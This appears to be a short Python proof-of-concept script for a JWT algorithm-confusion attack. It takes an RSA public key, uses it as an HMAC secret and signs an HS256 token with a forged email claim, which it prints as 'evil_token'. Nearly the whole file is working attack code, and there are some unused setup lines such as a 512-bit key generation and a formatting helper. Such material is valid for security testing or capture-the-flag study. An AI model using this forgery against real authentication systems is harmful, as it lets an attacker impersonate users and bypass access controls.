from authlib.jose import jwt
from Crypto.PublicKey import RSA
from Crypto.Hash import HMAC, SHA256
import base64
import datetime
import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# ----- SETUP -----

# generate an asymmetric RSA keypair
# !! signing should only be possible with the private key !!
time = datetime.datetime.now()
KEY = RSA.generate(512)

print("time taken to generate", datetime.datetime.now()-time)


def format_rsa_public_key(key_str):
    #byte_len = 32 #64
    byte_len = 64
    key_str = key_str.replace(" ", "").replace("\n", "")
    formatted_key = "-----BEGIN RSA PUBLIC KEY-----\n"
    
    # Split the key into 64-character lines
    for i in range(0, len(key_str), byte_len):
        formatted_key += key_str[i:i+byte_len] + "\n"
    
    formatted_key += "-----END RSA PUBLIC KEY-----\n"
    return formatted_key


public_key = "-----BEGIN RSA PUBLIC KEY-----\nMEcCQE3BZ5v5u6o5QxbMhNhrIEHEIXZyldR6dXk8jL5bOBqUjP5fykebKVW+7oID\nQE5/DKK5Spw/49n6CL+ncH4RgIcCAwEAAQ==\n-----END RSA PUBLIC KEY-----\n"
PUBKEY = RSA.import_key(public_key)
PUBKEY = PUBKEY.public_key().export_key(format='PEM')
print(PUBKEY)


b64 = lambda x:base64.urlsafe_b64encode(x).replace(b'=',b'')
payload = b64(b'{"alg":"HS256"}') + b'.' + b64(b'{"email":"1111@11112132313123dawdaw"}')
hasher = HMAC.new(PUBKEY, digestmod=SHA256)
hasher.update(payload)
evil_token = payload + b'.' + b64(hasher.digest())
print("ðŸ˜ˆ",evil_token)
